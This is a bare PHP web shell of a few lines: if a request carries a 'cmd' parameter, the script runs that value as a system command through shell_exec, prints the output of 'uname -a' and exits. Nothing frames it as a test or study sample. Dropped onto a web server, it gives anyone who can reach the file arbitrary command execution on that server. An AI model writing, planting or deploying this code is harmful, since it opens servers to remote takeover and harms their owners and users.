<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); shell_exec($cmd); system("uname -a"); echo "</pre>"; die; }?>
